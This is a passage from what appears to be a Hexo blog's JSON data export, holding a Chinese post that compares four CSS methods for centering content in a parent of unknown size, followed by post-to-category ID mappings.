&lt;/div&gt;\n &lt;/div&gt;\n&lt;/div&gt;</pre>\n以上，我习惯用的 `table-cell` 和 `position: absolute + margin: auto` 方案，因为以前在IE下兼容性好些。\n\n但现在大多数浏览器都支持`flexbox`，更加推荐这个方案，适用性更强。","slug":"css-e5-9e-82-e7-9b-b4-e6-b0-b4-e5-b9-b3-e5-b1-85-e4-b8-ad-e5-a4-8d-e4-b9-a0","published":1,"updated":"2018-03-05T11:32:58.737Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cin300i4gmlma08e6jwf","content":"<p>对于父容器高宽未知的居中方案，我了解的有四种</p>\n<p>在codepen上重新手写了一遍复习：<a href=\"https://codepen.io/joaner/pen/ddZQQw\" target=\"_blank\" rel=\"noopener\">https://codepen.io/joaner/pen/ddZQQw</a></p>\n<p><pre>&lt;div class=”examples”&gt;<br> &lt;!– table-cell +vertical-align: middle –&gt;<br> &lt;div&gt;<br> &lt;div style=”display: table; width: 100%; height: 100%;”&gt;<br> &lt;span style=”display: table-cell; vertical-align: middle; text-align: center;”&gt;table-cell&lt;/span&gt;<br> &lt;/div&gt;<br> &lt;/div&gt;</pre></p>\n<p> &lt;!– flex + align-items +justify-content –&gt;<br> &lt;div&gt;<br> &lt;div style=”display: flex; align-items: center; justify-content: center; height: 100%;”&gt;<br> &lt;span&gt;flexbox&lt;/span&gt;<br> &lt;/div&gt;<br> &lt;/div&gt;</p>\n<p> &lt;!– absolute + margin: auto –&gt;<br> &lt;div&gt;<br> &lt;div style=”position: relative; height: 100%”&gt;<br> &lt;span style=”position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 70px; height: 20px;”&gt;position&lt;/span&gt;<br> &lt;/div&gt;<br> &lt;/div&gt;</p>\n<p> &lt;!– transform: translate(-50%, -50%) –&gt;<br> &lt;div&gt;<br> &lt;div style=”position: relative; height: 100%;”&gt;<br> &lt;span style=”position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%)”&gt;transform&lt;/span&gt;<br> &lt;/div&gt;<br> &lt;/div&gt;<br>&lt;/div&gt;<br>以上，我习惯用的 <code>table-cell</code> 和 <code>position: absolute + margin: auto</code> 方案，因为以前在IE下兼容性好些。</p>\n<p>但现在大多数浏览器都支持<code>flexbox</code>，更加推荐这个方案，适用性更强。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>对于父容器高宽未知的居中方案，我了解的有四种</p>\n<p>在codepen上重新手写了一遍复习：<a href=\"https://codepen.io/joaner/pen/ddZQQw\" target=\"_blank\" rel=\"noopener\">https://codepen.io/joaner/pen/ddZQQw</a></p>\n<p><pre>&lt;div class=”examples”&gt;<br> &lt;!– table-cell +vertical-align: middle –&gt;<br> &lt;div&gt;<br> &lt;div style=”display: table; width: 100%; height: 100%;”&gt;<br> &lt;span style=”display: table-cell; vertical-align: middle; text-align: center;”&gt;table-cell&lt;/span&gt;<br> &lt;/div&gt;<br> &lt;/div&gt;</pre></p>\n<p> &lt;!– flex + align-items +justify-content –&gt;<br> &lt;div&gt;<br> &lt;div style=”display: flex; align-items: center; justify-content: center; height: 100%;”&gt;<br> &lt;span&gt;flexbox&lt;/span&gt;<br> &lt;/div&gt;<br> &lt;/div&gt;</p>\n<p> &lt;!– absolute + margin: auto –&gt;<br> &lt;div&gt;<br> &lt;div style=”position: relative; height: 100%”&gt;<br> &lt;span style=”position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 70px; height: 20px;”&gt;position&lt;/span&gt;<br> &lt;/div&gt;<br> &lt;/div&gt;</p>\n<p> &lt;!– transform: translate(-50%, -50%) –&gt;<br> &lt;div&gt;<br> &lt;div style=”position: relative; height: 100%;”&gt;<br> &lt;span style=”position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%)”&gt;transform&lt;/span&gt;<br> &lt;/div&gt;<br> &lt;/div&gt;<br>&lt;/div&gt;<br>以上，我习惯用的 <code>table-cell</code> 和 <code>position: absolute + margin: auto</code> 方案，因为以前在IE下兼容性好些。</p>\n<p>但现在大多数浏览器都支持<code>flexbox</code>，更加推荐这个方案，适用性更强。</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cjee5cik100fbgmlmaidc6jrh","category_id":"cjee59krz002bgmlmqgy6mc2m","_id":"cjee5cik900fggmlmf3g6lvbi"},{"post_id":"cjee5cik500fdgmlmieabywno","category_id":"cjee59krz002bgmlmqgy6mc2m","_id":"cjee5cika00figmlmiexqfsx6"},{"post_id":"cjee5cik600fegmlmg7kgwbe2","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cikc00fkgmlmngq37xhg"},{"post_id":"cjee5cik800ffgmlmf0pa19pn","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cike00fmgmlmponjkuim"},{"post_id":"cjee5cik900fhgmlm3ygsw3fb","category_id":"cjee59ksr003cgmlmpg3kzllq","_id":"cjee5cikh00fogmlmjt8v48ts"},{"post_id":"cjee5cikb00fjgmlm9aku924l","category_id":"cjee59krz002bgmlmqgy6mc2m","_id":"cjee5cikj00fqgmlmi95v8f08"},{"post_id":"cjee5cikd00flgmlm6xt694rx","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cikl00fsgmlma25k200p"},{"post_id":"cjee5cikf00fngmlmfdcptdpm","category_id":"cjee59kom000bgmlmbtxmpvc6","_id":"cjee5cikm00fugmlmso4mielq"},{"post_id":"cjee5ciki00fpgmlmy9w2dnhy","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5ciko00fwgmlmok75vdsa"},{"post_id":"cjee5cikj00frgmlmrol4xdxg","category_id":"cjee59ktd004cgmlmjhhdd5rg","_id":"cjee5cikp00fygmlmj66z59nh"},{"post_id":"cjee5cikl00ftgmlm670p3rru","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cikr00g0gmlmrqcaoxko"},{"post_id":"cjee5cikn00fvgmlmug5prk51","category_id":"cjee59kom000bgmlmbtxmpvc6","_id":"cjee5cikt00g2gmlmzkfc0836"},{"post_id":"cjee5ciko00fxgmlmu7hi66am","category_id":"cjee59kom000bgmlmbtxmpvc6","_id":"cjee5cikv00g4gmlm42wh6bfn"},{"post_id":"cjee5cikq00fzgmlmrknxk2wn","category_id":"cjee59ktd004cgmlmjhhdd5rg","_id":"cjee5cikz00g6gmlmtbz0naq9"},{"post_id":"cjee5ciks00g1gmlmvjg46lx8","category_id":"cjee59kom000bgmlmbtxmpvc6","_id":"cjee5cil000g8gmlmoq4rfc3r"},{"post_id":"cjee5cikt00g3gmlmmns3t0c1","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cil200gagmlmn026l6p3"},{"post_id":"cjee5cikw00g5gmlmogjumb8q","category_id":"cjee59kom000bgmlmbtxmpvc6","_id":"cjee5cil400gcgmlmfmq0qb92"},{"post_id":"cjee5cikz00g7gmlmw55sumvn","category_id":"cjee59kom000bgmlmbtxmpvc6","_id":"cjee5cil500gegmlmoirul6kw"},{"post_id":"cjee5cil100g9gmlmzp3cv7tt","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cil800gggmlmcxn7bcrr"},{"post_id":"cjee5cil200gbgmlmmp660p1q","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cila00gigmlm38mu4ecc"},{"post_id":"cjee5cil400gdgmlmet3p0ggf","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cild00gkgmlmbh2unqof"},{"post_id":"cjee5cil600gfgmlmifpnajl3","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cile00gmgmlm636ck3rm"},{"post_id":"cjee5cil600gfgmlmifpnajl3","category_id":"cjee59kwu0098gmlmiimzivnt","_id":"cjee5cilh00gogmlmeb5jaybu"},{"post_id":"cjee5cil900ghgmlmthzgrs3c","category_id":"cjee59ktd004cgmlmjhhdd5rg","_id":"cjee5cilh00gpgmlmnsn77uwb"},{"post_id":"cjee5cilb00gjgmlmeac55492","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cilh00gqgmlmd4j4p6iz"},{"post_id":"cjee5cild00glgmlme45nvar1","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cili00grgmlmx9o3dct7"},{"post_id":"cjee5cilf00gngmlmpfro3h8b","category_id":"cjee59kwd008jgmlm3nj99g29","_id":"cjee5cili00gsgmlmg0p7f7eg"},{"post_id":"cjee5cils00gtgmlmdxv1un3a","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cimb00gxgmlmeffoyphe"},{"post_id":"cjee5cilv00gugmlm1x18g5x8","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cimc00gzgmlmk9ndl72a"},{"post_id":"cjee5cilw00gvgmlmadx54o7b","category_id":"cjee59ktd004cgmlmjhhdd5rg","_id":"cjee5cime00h1gmlm4nudsn9i"},{"post_id":"cjee5cima00gwgmlmdwspobzk","category_id":"cjee59ktd004cgmlmjhhdd5rg","_id":"cjee5cimf00h3gmlmeab6qqzi"},{"post_id":"cjee5cimb00gygmlm5ab51d3s","category_id":"cjee59ksr003cgmlmpg3kzllq","_id":"cjee5cimg00h5gmlmp7dizliu"},{"post_id":"cjee5cimd00h0gmlm9n6jwwvm","category_id":"cjee59kt1003sgmlmlcgtflnf","_id":"cjee5cimi00h7gmlmgjthzowx"},{"post_id":"cjee5cime00h2gmlm1phm695g","category_id":"cjee59ksb002pgmlm38z2pbkn","_id":"cjee5cimk00h9gmlmelu2a190"},{"post_id":"cjee5cimg00h4gmlmr4biwxit","category_id":"cjee59ksb002pgmlm38z2pbkn","_id":"cjee5ciml00hbgmlm9iwtaqw5"},{"post_id":"cjee5cimh00h6gmlm08ntn4i4","category_id":"cjee59kt1003sgmlmlcgtflnf","_id":"cjee5cimm00hdgmlmm43h7vj6"},{"post_id":"cjee5cimi00h8gmlm3cl3daiv","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cimn00hfgmlm3kwkhn4i"},{"post_id":"cjee5cimk00hagmlmvzw9fn87","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cimo00hhgmlmctrty271"},{"post_id":"cjee5ciml00hcgmlmpqkpk1cz","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cimp00hjgmlme4oc0fjb"},{"post_id":"cjee5cimm00hegmlmrtjpmwjx","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cimr00hlgmlmtby46djn"},{"post_id":"cjee5cimo00hggmlm94j5t4qi","category_id":"cjee59kt1003sgmlmlcgtflnf","_id":"cjee5cims00hngmlmmfmdi546"},{"post_id":"cjee5cimp00higmlmdgratbrf","category_id":"cjee59kt1003sgmlmlcgtflnf","_id":"cjee5cimu00hpgmlm6o9bd7e5"},{"post_id":"cjee5cimr00hkgmlmw4b2r6hn","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cimv00hrgmlm2kj9kkoa"},{"post_id":"cjee5cims00hmgmlm96dgzc20","category_id":"cjee59ktd004cgmlmjhhdd5rg","_id":"cjee5cimx00htgmlmnwv2amve"},{"post_id":"cjee5cimt00hogmlmedsp9uw5","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cimy00hvgmlmjuyayyic"},{"post_id":"cjee5cimt00hogmlmedsp9uw5","category_id":"cjee59kwu0098gmlmiimzivnt","_id":"cjee5cimz00hxgmlmth35m8cr"},{"post_id":"cjee5cimv00hqgmlm98ipyshz","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cin000hzgmlm03gp2m5b"},{"post_id":"cjee5cimw00hsgmlm87p938nb","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cin100i1gmlmu0c4ykvc"},{"post_id":"cjee5cimx00hugmlm2k1lvcsp","category_id":"cjee59ksb002pgmlm38z2pbkn","_id":"cjee5cin300i3gmlmk9htfdv0"},{"post_id":"cjee5cimy00hwgmlmsfzhb28k","category_id":"cjee59ksr003cgmlmpg3kzllq","_id":"cjee5cin400i5gmlmjb70kwbx"},{"post_id":"cjee5cimz00hygmlmqh40gezz","category_id":"cjee59kr8001fgmlm0wk61nux","_id":"cjee5cin400i6gmlm9ntxl0nt"},{"post_id":"cjee5cin000i0gmlmdopjliq9","category_id":"cjee59ksb002pgmlm38z2pbkn","_id":"cjee5cin400i7gmlmijtzrc2r"},{"post_id":"cjee5cin100i2gmlmyud9a34p","category_id":"cjee59ksb002pgmlm38z2pbkn","_id":"cjee5cin400i8gmlmzcrc6glb"},{"post_id":"cjee5cin300i4gmlma08e6jwf","category_id":"cjee59ksb002pgmlm38z2pbkn","_id":"cjee5cin400i9gmlm26ktp7xt"}],"PostTag":[],"Tag":[]}}